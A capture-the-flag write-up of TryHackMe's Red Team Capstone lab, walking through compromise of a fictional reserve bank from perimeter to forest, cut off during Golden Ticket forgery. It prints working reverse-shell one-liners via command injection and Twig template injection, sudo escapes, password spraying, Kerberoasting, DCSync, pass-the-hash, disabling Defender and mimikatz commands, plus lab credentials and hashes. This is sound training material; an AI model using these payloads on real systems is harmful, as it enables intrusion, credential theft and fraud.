---
icon: google-scholar
cover: >-
  ../.gitbook/assets/samurai-katana-warrior-immortal-sun-silhouette-black-3840x2160-7471
  (1).png
coverY: 238.9440603394092
---

# RED TEAM CAPSTONE CHALLENGE

<figure><img src="../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>TARGET INFORMATION</summary>

## Project Overview <a href="#id-129143da-56d9-4d8a-ac94-e20b628d05b9" id="id-129143da-56d9-4d8a-ac94-e20b628d05b9"></a>

TryHackMe, a cybersecurity consultancy firm, has been approached by the government of Trimento to perform a red team engagement against their Reserve Bank (TheReserve).

Trimento is an island country situated in the Pacific. While they may be small in size, they are by no means not wealthy due to foreign investment. Their reserve bank has two main divisions:

* **Corporate** - The reserve bank of Trimento allows foreign investments, so they have a department that takes care of the country's corporate banking clients.
* **Bank** - The reserve bank of Trimento is in charge of the core banking system in the country, which connects to other banks around the world.

The Trimento government has stated that the assessment will cover the entire reserve bank, including both its perimeter and internal networks. They are concerned that the corporate division while boosting the economy, may be endangering the core banking system due to insufficient segregation. The outcome of this red team engagement will determine whether the corporate division should be spun off into its own company.

#### Project Goal <a href="#b5dd6c06-e965-43aa-9e4c-1abc0531ebff" id="b5dd6c06-e965-43aa-9e4c-1abc0531ebff"></a>

The purpose of this assessment is to evaluate whether the corporate division can be compromised and, if so, determine if it could compromise the bank division. A simulated fraudulent money transfer must be performed to fully demonstrate the compromise.

To do this safely, TheReserve will create two new core banking accounts for you. You will need to demonstrate that it's possible to transfer funds between these two accounts. The only way this is possible is by gaining access to SWIFT, the core backend banking system.

To help you understand the project goal, the government of Trimento has shared some information about the SWIFT backend system. SWIFT runs in an isolated secure environment with restricted access. While the word impossible should not be used lightly, the likelihood of the compromise of the actual hosting infrastructure is so slim that it is fair to say that it is impossible to compromise this infrastructure.

However, the SWIFT backend exposes an internal web application at [http://swift.bank.thereserve.loc/,](http://swift.bank.thereserve.loc/,) which TheReserve uses to facilitate transfers. The government has provided a general process for transfers. To transfer funds:

1. A customer makes a request that funds should be transferred and receives a transfer code.
2. The customer contacts the bank and provides this transfer code.
3. An employee with the capturer role authenticates to the SWIFT application and _captures_ the transfer.
4. An employee with the approver role reviews the transfer details and, if verified, _approves_ the transfer. This has to be performed from a jump host.
5. Once approval for the transfer is received by the SWIFT network, the transfer is facilitated and the customer is notified.

Separation of duties is performed to ensure that no single employee can both capture and approve the same transfer.

## Project Scope <a href="#b7e602a5-d2ee-44e7-9cbb-6c82ec8fcbf7" id="b7e602a5-d2ee-44e7-9cbb-6c82ec8fcbf7"></a>

This section details the project scope.

In-Scope

* Security testing of TheReserve's internal and external networks, including all IP ranges accessible through your VPN connection.
* OSINTing of TheReserve's corporate website, which is exposed on the external network of TheReserve. Note, this means that all OSINT activities should be limited to the provided network subnet and no external internet OSINTing is required.
* Phishing of any of the employees of TheReserve.
* Attacking the mailboxes of TheReserve employees on the WebMail host (.11).
* Using any attack methods to complete the goal of performing the transaction between the provided accounts.

Out-of-Scope

* Security testing of any sites not hosted on the network.
* Security testing of the TryHackMe VPN (.250) and scoring servers, or attempts to attack any other user connected to the network.
* Any security testing on the WebMail server (.11) that alters the mail server configuration or its underlying infrastructure.
* Attacking the mailboxes of other red teamers on the WebMail portal (.11).
* External (internet) OSINT gathering.
* Attacking any hosts outside of the provided subnet range. Once you have completed the questions below, your subnet will be displayed in the network diagram. This 10.200.X.0/24 network is the only in-scope network for this challenge.
* Conducting DoS attacks or any attack that renders the network inoperable for other users.

### Project Registration <a href="#id-3ed0f9d6-0273-4a7a-9746-8b6514bbfb53" id="id-3ed0f9d6-0273-4a7a-9746-8b6514bbfb53"></a>

The Trimento government mandates that all red teamers from TryHackMe participating in the challenge must register to allow their single point of contact for the engagement to track activities. As the island's network is segregated, this will also provide the testers access to an email account for communication with the government and an approved phishing email address, should phishing be performed.

To register, you need to get in touch with the government through its e-Citizen communication portal that uses SSH for communication. Here are the SSH details provided:

| **SSH Username** | e-citizen                |
| ---------------- | ------------------------ |
| **SSH Password** | stabilitythroughcurrency |
| **SSH IP**       | X.X.X.250                |

Once you complete the questions below, the network diagram at the start of the room will show the IP specific to your network. Use that information to replace the X values in your SSH IP.

Once you authenticate, you will be able to communicate with the e-Citizen system. Follow the prompts to register for the challenge, and save the information you get for future reference. Once registered, follow the instructions to verify that you have access to all the relevant systems.

**Note:** The VPN server and the e-Citizen platform are not in scope for this assessment, and any security testing of these systems may lead to a ban from the challenge.

<br>

</details>

<figure><img src="../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

### Info ji

TheReserve bank's infrastructure, from initial external foothold through full domain compromise and culminating in unauthorized SWIFT payment transfer. The engagement demonstrated critical security gaps across network segmentation, credential management, Active Directory security, and privileged access controls.

***

### Reconnaissance & Initial Access

#### E-Citizen Portal Registration

The first step was registering with the E-Citizen portal to obtain our credentials and network information.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ ssh e-citizen@10.200.118.250
```

**Credentials obtained:**

* Username: prokunal
* Password: GoA59DwbCXp3rT4r
* Email: prokunal@corp.th3reserve.loc
* Network: 10.200.118.0/24

**Logic:** The E-Citizen portal serves as the engagement coordinator, tracking our progress and providing mission-critical information like email access for phishing operations.

#### Initial Network Reconnaissance

Performed comprehensive network scanning to identify live hosts and services.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ nmap -sn 10.200.118.0/24 -oN network_sweep.txt

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ cat network_sweep.txt | grep "Nmap scan report" | awk '{print $5}' > live_hosts.txt
```

**Key hosts identified:**

* 10.200.118.11 - WebMail Server
* 10.200.118.12 - VPN Gateway
* 10.200.118.13 - Corporate Web Server
* 10.200.118.21/22 - Workstations (WRK1/WRK2)
* 10.200.118.31/32 - Servers (SERVER1/SERVER2)
* 10.200.118.101 - BANKDC
* 10.200.118.102 - CORPDC
* 10.200.118.250 - E-Citizen Portal

***

### VPN Host Exploitation (10.200.118.12)

#### Service Enumeration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ nmap -sC -sV -p- 10.200.118.12 -oN vpn_detailed.txt
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
80/tcp   open  http    Apache httpd 2.4.29
1194/tcp open  openvpn
```

#### Web Application Analysis

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ curl http://10.200.118.12/ -v

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ gobuster dir -u http://10.200.118.12/ -w /usr/share/wordlists/dirb/common.txt -o vpn_dirs.txt
```

**Discovery:** Found `/vpn/` directory containing configuration files.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ wget http://10.200.118.12/vpn/thereserve.ovpn

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ cat thereserve.ovpn
```

**Logic:** The VPN configuration file was exposed but required authentication. However, the login mechanism had a critical flaw.

#### Authentication Bypass

The login page accepted any username without password validation:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ curl -X POST http://10.200.118.12/login.php -d "username=test&password=" -v
```

**Vulnerability:** NULL password bypass allowed unauthorized access to authenticated features.

#### Command Injection Discovery

Testing the `requestvpn.php?filename=` parameter:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ curl "http://10.200.118.12/requestvpn.php?filename=test%20%26%26%20sleep%205" -v
```

**Response time:** 5+ seconds delay confirmed command injection vulnerability.

**Logic:** The application likely executes shell commands to generate VPN configurations without proper input sanitization. The `&&` operator allows command chaining in bash.

#### Reverse Shell Exploitation

Generated payload using revshells.com:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ nc -lvnp 4444

# In another terminal:
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ curl "http://10.200.118.12/requestvpn.php?filename=test%20%26%26%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.153%2F4444%200%3E%261%27"
```

**Shell obtained as:** www-data

#### Database Credential Discovery

```bash
www-data@vpn:/var/www/html$ cat db_connect.php
```

**Credentials found:**

```php
DB_USER: vpn
DB_PASSWD: password1!
```

**Logic:** Web applications often store database credentials in configuration files. This password follows TheReserve's policy (8 chars, 1 number, 1 special character).

#### Privilege Escalation via Sudo

```bash
www-data@vpn:/var/www/html$ sudo -l
```

**Output:** `(root) NOPASSWD: /bin/cp`

**Exploitation strategy:** Abuse `sudo cp` to write our SSH public key to authorized\_keys.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ ssh-keygen -t rsa -b 4096 -f ./vpn_key

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ cat vpn_key.pub
```

On target:

```bash
www-data@vpn:/var/www/html$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD..." | sudo /bin/cp /dev/stdin /home/ubuntu/.ssh/authorized_keys

www-data@vpn:/var/www/html$ sudo /bin/cp /dev/stdin /home/ubuntu/.ssh/authorized_keys <<EOF
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD...
EOF
```

**Logic:** GTFOBins shows that `cp` can read from stdin (`/dev/stdin`) and write to privileged locations. By piping our public key through stdin, we bypass file permission restrictions.

#### SSH Access & Root Escalation

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ chmod 600 vpn_key

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ ssh -i vpn_key ubuntu@10.200.118.12

ubuntu@vpn:~$ sudo -l
```

**Output:** `(ALL : ALL) ALL`

```bash
ubuntu@vpn:~$ sudo su -
root@vpn:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Achievement:** Root access on VPN gateway provides pivot point into internal network.

***

### Web Server Exploitation (10.200.118.13)

#### Service Discovery

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ nmap -sC -sV -p- 10.200.118.13 -oN web_detailed.txt
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29
```

#### October CMS Discovery

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ curl http://10.200.118.13/ -v

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ whatweb http://10.200.118.13/
```

**Identified:** October CMS installation

#### Employee Username Enumeration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ curl http://10.200.118.13/about-us -s | grep -oP '(?<=src=")[^"]*\.jpeg' | sed 's/.jpeg$//' | awk -F'/' '{print $NF}' > employees.txt

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ cat employees.txt
laura.wood
mohammad.ahmed
g.watson
r.davies
a.holt
```

**Logic:** Employee photos were named using their usernames (firstname.lastname.jpeg format), providing a valid user list for future attacks.

#### October CMS Backend Discovery

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.200.118.13/FUZZ -fc 404

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ curl http://10.200.118.13/october/index.php/backend/
```

**Found:** Admin login at `/october/index.php/backend/backend/auth/signin`

#### Password Policy Analysis & Generation

Based on discovered policy (8 chars, 1 number, 1 special char):

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ cat > generate_passwords.py << 'EOF'
special_chars = "!@$#"
numbers = "1234567890"

with open("password_base_list.txt", "r") as f:
    words = f.read().strip().split('\n')

for word in words:
    for num in numbers:
        for char in special_chars:
            print(f"{word}{num}{char}")
            print(f"{word}{char}{num}")
EOF

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ python3 generate_passwords.py > october_passwords.txt
```

#### October CMS Brute Force

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ hydra -l admin -P october_passwords.txt 10.200.118.13 http-post-form "/october/index.php/backend/backend/auth/signin:login=^USER^&password=^PASS^:F=Invalid" -t 4 -V
```

**Note:** Account lockout detected. Reconnected VPN and tested manually with common passwords.

**Success:** `admin:password1!`

**Logic:** Admins often reuse simple passwords that meet minimum requirements. The password "password1!" satisfies the policy and is human-memorable.

#### Server-Side Template Injection (SSTI)

After logging into October CMS:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ curl http://10.200.118.13/october/index.php/exploit -s | grep -i "49"
```

**SSTI Test Payload:** `{{7*7}}`

Created new page in October CMS:

* **Path:** CMS → Pages → Add
* **Title:** exploit
* **Filename:** exploit
* **Markup:** `{{7*7}}`

**Result:** Page displayed "49" confirming SSTI vulnerability.

**Logic:** October CMS uses Twig templating engine. The `{{ }}` syntax executes server-side expressions, allowing arbitrary code execution.

#### Twig RCE Payload Discovery

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ curl http://10.200.118.13/october/index.php/exploit -d "{{[0]|reduce('system','id')}}" -s
```

**Working payload:** `{{[0]|reduce('system','id')}}`

**Logic:** The `reduce` filter in Twig can execute PHP functions. By passing 'system' as the callback and 'id' as the parameter, we achieve command execution.

#### Reverse Shell via SSTI

Updated page markup:

```twig
{{[0]|reduce('system','bash -c "bash -i >& /dev/tcp/10.10.15.153/4445 0>&1"')}}
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ nc -lvnp 4445

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ curl http://10.200.118.13/october/index.php/exploit
```

**Shell obtained as:** www-data

#### Database Credential Extraction

```bash
www-data@web:/var/www/html/october/config$ cat database.php
```

**MySQL Credentials:**

```php
'username' => 'october',
'password' => 'password1!',
```

#### Privilege Escalation via Vim

```bash
www-data@web:/var/www/html$ sudo -l
```

**Output:** `(root) NOPASSWD: /usr/bin/vim`

**Exploitation:**

```bash
www-data@web:/var/www/html$ sudo /usr/bin/vim -c ':!/bin/bash'
```

Or alternatively:

```bash
www-data@web:/var/www/html$ sudo vim
# Inside vim:
:!/bin/sh
```

**Root shell obtained!**

**Logic:** Vim has a shell escape feature (`:!command`). When run with sudo, this spawns a root shell. This is a well-documented GTFOBins technique.

#### SSH Persistence

```bash
root@web:~# mkdir -p /root/.ssh

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ ssh-keygen -t rsa -b 4096 -f ./web_key

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ cat web_key.pub | ssh root@10.200.118.13 "cat > /root/.ssh/authorized_keys"

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ chmod 600 web_key

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ ssh -i web_key root@10.200.118.13
```

***

### Flag Verification - Perimeter Breach

#### Thunderbird Mail Configuration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ wget https://download.mozilla.org/?product=thunderbird-latest&os=linux64&lang=en-US -O thunderbird.tar.bz2

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ tar -xvf thunderbird.tar.bz2

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ cd thunderbird && ./thunderbird
```

**Mail Configuration:**

* **Email:** prokunal@corp.th3reserve.loc
* **Password:** GoA59DwbCXp3rT4r
* **IMAP Server:** 10.200.118.11:143
* **SMTP Server:** 10.200.118.11:587

#### E-Citizen Flag Submission

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ ssh e-citizen@10.200.118.250

# Selection: [2] Authenticate
# Username: prokunal
# Selection: [1] Submit proof of compromise
# Selection: [1] Perimeter Breach
# Hostname: WEB
```

On WEB server:

```bash
root@web:~# mkdir -p /flag
root@web:~# echo "00df9842-d72b-4a00-bfc6-024b0840c2f7" > /flag/prokunal.txt
```

**Flag received via email**

**Logic:** E-Citizen verifies compromise by SSH'ing to the target and checking for our UUID file. This proves we have root access and can create files in the specified location.

***

### Internal Network Pivoting

#### SOCKS Proxy Setup

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ ssh -i vpn_key -D 9050 ubuntu@10.200.118.12
```

#### Proxychains Configuration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ sudo vim /etc/proxychains4.conf
```

Add/verify:

```
socks4 127.0.0.1 9050
```

#### Internal Network Scanning

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q nmap -sn 10.200.118.0/24 -oN internal_sweep.txt

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q nmap -sC -sV 10.200.118.101,102 -oN dc_scan.txt
```

**Logic:** The SOCKS proxy tunnels all traffic through the compromised VPN host, allowing us to reach internal network segments that aren't directly routable from the internet.

***

### Active Directory Reconnaissance

#### SMTP Password Spraying

Created comprehensive email list:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ cat employees.txt | sed 's/$/@corp.thereserve.loc/' > emails.txt

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ cat > smtp_spray.sh << 'EOF'
#!/bin/bash
while IFS= read -r email; do
    while IFS= read -r pass; do
        echo "Testing: $email:$pass"
        proxychains -q python3 smtp-user-enum.py -M LOGIN -u "$email" -p "$pass" -H 10.200.118.11 -P 587
    done < october_passwords.txt
done < emails.txt
EOF

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ chmod +x smtp_spray.sh && ./smtp_spray.sh
```

**Valid credentials discovered:**

```
laura.wood@corp.thereserve.loc:Password1@
mohammad.ahmed@corp.thereserve.loc:Password1!
svcOctober@corp.thereserve.loc:ServicePassword1@
```

**Logic:** Password spraying tests one password against many users, avoiding account lockouts. TheReserve's weak password policy allows multiple users to share similar passwords.

#### SMB Enumeration with Valid Credentials

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q crackmapexec smb 10.200.118.21,22,31,32,101,102 -d corp.thereserve.loc -u svcOctober -p 'ServicePassword1@' --shares
```

**Key findings:**

* **CORPDC (10.200.118.102):** SYSVOL, NETLOGON accessible
* **BANKDC (10.200.118.101):** SYSVOL, NETLOGON accessible
* **WRK1/2:** Standard workstation shares
* **SERVER1/2:** Administrative shares blocked

**Logic:** Service accounts often have broad read access across the domain. The svcOctober account, used for SMTP, has SMB authentication rights that we can leverage for reconnaissance.

#### RDP Access to WRK1

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q xfreerdp /v:10.200.118.21 /u:laura.wood /p:'Password1@' /cert-ignore +clipboard
```

**Success:** GUI access to domain-joined workstation

**Logic:** Laura Wood's SMTP credentials also work for Windows authentication, demonstrating password reuse across services. This is common in enterprise environments but highly exploitable.

#### Active Directory Flag Verification

Logged into E-Citizen, selected Active Directory Breach flag:

On WRK1:

```cmd
C:\Users\laura.wood> mkdir C:\Windows\Temp\flag
C:\Users\laura.wood> echo <UUID> > C:\Windows\Temp\prokunal.txt
```

**Flag received via email**

***

### BloodHound Collection & Analysis

#### BloodHound.py Execution

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ git clone https://github.com/fox-it/BloodHound.py.git

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ cd BloodHound.py

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE/BloodHound.py]
└─$ proxychains -q python3 bloodhound.py -u laura.wood -p 'Password1@' -d corp.thereserve.loc -ns 10.200.118.102 --dns-tcp -c All --disable-autogc
```

**Output:** JSON files containing AD relationships

**Logic:** BloodHound.py queries the Domain Controller via LDAP to extract all users, groups, computers, and trust relationships. The `--dns-tcp` flag ensures DNS queries work through our SOCKS proxy.

#### Neo4j & BloodHound Setup

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ sudo apt install neo4j -y

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ neo4j console
```

Access http://localhost:7474

* Default: neo4j:neo4j
* Changed to: neo4j:bloodhound

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ wget https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/BloodHound-linux-x64.zip

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ unzip BloodHound-linux-x64.zip

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ cd BloodHound-linux-x64 && ./BloodHound --no-sandbox
```

Imported all JSON files via drag-and-drop.

#### BloodHound Analysis - Key Findings

**Query:** "Shortest Path to Domain Admins"

**Critical Discovery:**

```
svcBackups@CORP.THERESERVE.LOC
  └─ Has DCSync Rights on CORP.THERESERVE.LOC
```

**Logic:** DCSync is an attack technique that mimics a Domain Controller's replication process, allowing extraction of password hashes. If we compromise svcBackups, we can dump all domain credentials including the krbtgt hash.

***

### Kerberoasting Attack

#### Service Principal Name (SPN) Discovery

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q impacket-GetUserSPNs corp.thereserve.loc/laura.wood:'Password1@' -dc-ip 10.200.118.102 -request
```

**Output:**

```
ServicePrincipalName  Name         PasswordLastSet
cifs/svcBackups       svcBackups   2023-02-15 04:05:59
http/svcEDR           svcEDR       2023-02-15 04:06:21
http/svcMonitor       svcMonitor   2023-02-15 04:06:43
cifs/scvScanning      svcScanning  2023-02-15 04:07:06
mssql/svcOctober      svcOctober   2023-02-15 04:07:45
```

**TGS Hashes obtained for offline cracking**

**Logic:** Kerberoasting exploits how Kerberos encrypts service tickets. When requesting a TGS (Ticket Granting Service) ticket for an SPN, the ticket is encrypted with the service account's password hash. We can crack this offline without triggering failed login alerts.

#### Hash Cracking

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ cat svc_hashes.txt | grep svcScanning > svcScanning.hash

┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt svcScanning.hash
```

**Cracked:** `svcScanning:Password1!`

**Logic:** Service accounts often have long-unchanged passwords. Using a comprehensive wordlist like RockYou (14M+ passwords), we can crack weak passwords that match common patterns.

***

### Lateral Movement to SERVER1

#### RDP Access

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q xfreerdp /v:10.200.118.31 /u:svcScanning /p:'Password1!' /cert-ignore +clipboard
```

**Success:** Access to SERVER1

#### Flag Submission

Verified CORP Tier 1 Foothold and Admin flags using E-Citizen protocol.

#### PowerShell Remoting Capability

From BloodHound analysis:

```
svcScanning@CORP.THERESERVE.LOC
  └─ CanPSRemote → SERVER1.CORP.THERESERVE.LOC
```

**Logic:** PSRemoting allows remote PowerShell execution. This capability can be abused to run commands with higher privileges if misconfigured.

***

### Credential Dumping & DCSync

#### Secretsdump on SERVER1

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q impacket-secretsdump corp.thereserve.loc/svcScanning:'Password1!'@10.200.118.31
```

**Key finding in output:**

```
[*] Cleaning up...
svcBackups@corp.thereserve.loc:q9nzssaFtGHdqUV3Qv6G
```

**Logic:** Secretsdump leverages Volume Shadow Copy Service (VSS) or registry dumps to extract locally cached credentials. The cleartext password for svcBackups was stored in LSA secrets or cached credentials.

#### DCSync Attack on CORPDC

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q impacket-secretsdump corp.thereserve.loc/svcBackups:'q9nzssaFtGHdqUV3Qv6G'@10.200.118.102
```

**Critical hashes dumped:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3a2a032a42b8e5...(truncated)
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a...(truncated)
```

**Logic:** DCSync uses the Directory Replication Service Remote Protocol (MS-DRSR) to request password data. Since svcBackups has "Replicating Directory Changes" and "Replicating Directory Changes All" permissions, the DC treats our request as legitimate replication traffic.

#### Pass-the-Hash to CORPDC

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3a2a032a42b8e5... administrator@10.200.118.102
```

**System shell obtained!**

**Alternative - Password Change:**

```cmd
C:\Windows\system32> net user Administrator Hacker@123 /domain
```

**Logic:** Pass-the-Hash (PtH) works because NTLM authentication only requires the password hash, not the plaintext password. We authenticate using the dumped hash directly.

#### RDP Access to CORPDC

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q xfreerdp /v:10.200.118.102 /u:Administrator /p:'Hacker@123' /cert-ignore +clipboard /multimon
```

**Full Domain Admin access achieved on CORP domain!**

***

### Golden Ticket Attack - Parent Domain Compromise

#### Mimikatz Deployment

On attacker machine:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/CAPSTONE-CHALLENGE]
└─$ proxychains -q python3 -m http.server 8080
```

On CORPDC (via RDP):

```powershell
PS C:\Users\Administrator> Invoke-WebRequest -Uri http://10.10.15.153:8080/mimikatz.exe -OutFile C:\Users\Administrator\mimikatz.exe

PS C:\Users\Administrator> Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring
PS C:\Users\Administrator> Set-MpPreference -DisableRealtimeMonitoring $true
```

**Logic:** Windows Defender blocks Mimikatz by signature. Temporarily disabling real-time protection allows execution. In a real engagement, we'd use obfuscation or in-memory techniques to avoid detection.

#### KRBTGT Hash Extraction via DCSync

On CORPDC, execute Mimikatz:

```cmd
C:\Users\Administrator> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /user:corp\krbtgt
```

**Output:**

```
Object RDN           : krbtgt
SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-170228521-1485475711-3199862024-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 0c757a3445acb94a654554f3ac529ede
```

**Key Information Extracted:**

* **KRBTGT NTLM Hash:** `0c757a3445acb94a654554f3ac529ede`

**Logic:** The krbtgt account is used to encrypt all Kerberos tickets in the domain. By obtaining its hash through DCSync, we can forge Golden Tickets - valid Kerberos TGTs that grant access to any resource in the domain and trusted domains.

#### Domain SID Collection

Still in CORPDC PowerShell:

```powershell
PS C:\Users\Administrator> Get-ADComputer -Identity "CORPDC"
```

**Output:**

```
DistinguishedName : CN=CORPDC,OU=Domain Controllers,DC=corp,DC=thereserve,DC=loc
DNSHostName       : CORPDC.corp.thereserve.loc
Enabled           : True
Name              : CORPDC
ObjectClass       : computer
ObjectGUID        : a1b2c3d4-e5f6-7890-abcd-ef1234567890
SamAccountName    : CORPDC$
SID               : S-1-5-21-170228521-1485475711-3199862024-1009
UserPrincipalName :
```

**CORPDC Domain SID:** `S-1-5-21-170228521-1485475711-3199862024`

**Logic:** We need the domain SID to craft the Golden Ticket. The last segment (-1009) is the RID (Relative Identifier) specific to this computer object. The domain SID is everything before the final RID.

#### Enterprise Admins SID Extraction

```powershell
PS C:\Users\Administrator> Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc
```

**Output:**

```
DistinguishedName : CN=Enterprise Admins,CN=Users,DC=thereserve,DC=loc
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : f9e8d7c6-b5a4-3210-9876-543210fedcba
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-1255581842-1300659601-3764024703-519
```

**Enterprise Admins SID:** `S-1-5-21-1255581842-1300659601-3764024703-519`

**Logic:** Enterprise Admins is a group that exists only in the forest root domain but has administrative rights across ALL domains in the forest. By including this SID in our Golden Ticket's SIDHistory, we gain forest-wide administrative access. The RID 519 is the well-known identifier for Enterprise Admins.

#### Golden Ticket Forgery

Back in Mimikatz on CORPDC:

```cmd
mimikatz # kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 /krbtgt:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt
```

**Command Breakdown:**

* `/user:Administrator` - Impersonate the Administrator account
* `/domain:corp.thereserve.loc` - Current domain
* `/sid:S-1-5-21-170228521-1485475711-3199862024` - CORPDC domain SID
